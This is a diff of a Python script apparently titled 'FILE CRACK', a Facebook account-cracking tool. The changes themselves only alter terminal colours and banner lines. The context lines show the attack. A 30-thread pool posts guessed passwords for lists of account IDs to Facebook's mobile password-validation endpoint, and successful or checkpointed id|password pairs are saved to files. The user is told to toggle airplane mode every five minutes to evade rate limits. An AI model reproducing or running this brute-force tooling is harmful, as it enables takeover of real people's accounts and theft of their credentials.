@@ -201,7 +201,7 @@ def setting():
 			xx = random.randint(0,len(id2))
 			id2.insert(xx,bacot)
 	else:
-		print (' [!] Choose Correct Option')
+		print (' [!] Choose \033[1;92mCorrect Option')
 		exit()
 	clear()
 	print(logo);print ('\n [01] Method 1 ');print (' [02] Method 2 \033[1;97m')
@@ -215,7 +215,7 @@ def setting():
 	passmenu()
 def passmenu():
 	clear()
-	print(logo);print  ('\n [01] First name digit pass \n [02] All Name Password \n [03] All Name+ password')
+	print(logo);print  ('\n [01] First name \033[1;92mdigit pass \n [02] All Name Password \n [03] All Name+ password')
 	passmen=input('\n [#] Select Pass : ')
 	if passmen in ['1','01']:
 		first()
@@ -255,7 +255,7 @@ def first():
 				pool.submit(crack,idf,pwv)
 def name():
 	clear()
-	print(logo);print( '\n [] OK Result Saved To : \033[1;92mOK/%s\033[1;97m\n [] CP Result Saved To : \033[1;91mCP/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
+	print(logo);print( '\n [] OK Result Saved To : \033[1;92mOK/%s\033[1;97m\n [] CP Result Saved To : \033[1;90mCP/%s\033[1;97m\n [!] \033[1;97mTurn Airplane Mode On/Off Every \033[1;92m5 Minutes\033[1;0m\n'%(okc,cpc))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			try:
@@ -324,7 +324,7 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cp +=1
-				print( f'\r\x1b[1;91m [ TONMOY-CP ] {idf} | {pw}')
+				print( f'\r\x1b[1;90m [ TONMOY-CP ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
@@ -394,12 +394,12 @@ logo = ("""
 \033[1;37m   ██    ██    ██ ██  ██ ██\033[1;32m ██  ██  ██ ██    ██    ██    
 \033[1;37m   ██     ██████  ██   ████\033[1;32m ██      ██  ██████     ██    
                                              
-\033[1;37m ══════════════════════════════════════════════════
+\033[1;37m ═══════════════════════════════════════════════════════
 \033[1;37mAUTHOR  : \033[1;32mTONMOY MAHATO                                                          
 \033[1;37mGITHUB  : \033[1;32mtonmoy404-cyber                                                             
 \033[1;37mYOU TUBE  : \033[1;32mTONMOY MAHATO                                                          
 \033[1;37mTOOL  : \033[1;32mFILE CRACK                                                                        
-\033[1;37m ══════════════════════════════════════════════════""")
+\033[1;37m ═══════════════════════════════════════════════════════""")
 
 class Main:
 	def __init__(self):
